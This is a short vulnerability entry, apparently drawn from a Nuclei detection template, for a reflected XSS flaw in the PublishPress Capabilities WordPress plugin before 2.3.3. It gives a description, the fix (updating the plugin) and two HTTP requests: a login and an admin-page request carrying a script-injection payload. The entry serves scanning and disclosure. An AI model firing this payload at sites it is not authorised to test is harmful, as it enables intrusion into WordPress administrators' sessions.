# Vulnerability: PublishPress Capabilities < 2.3.3 - Cross-Site Scripting
**Classification:** CWE-79
**Source:** Nuclei Template (`wp-publishpress-capabilities-xss.yaml`)

## Description
The PublishPress Capabilities plugin for WordPress before 2.3.3 does not escape a form action URL before outputting it back in an attribute, leading to Reflected Cross-Site Scripting (XSS).

## Secure Mitigation
Update the PublishPress Capabilities plugin to version 2.3.3 or later.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /wp-login.php?redirect_to=http%3A%2F%2F{{Hostname}}%2Fwp-admin%2Foptions-general.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

GET /wp-admin/admin.php?page=pp-capabilities-roles&a%22%3E%3Cscript%3Ealert("document.domain")%3C/script%3E HTTP/1.1
Host: {{Hostname}}
```

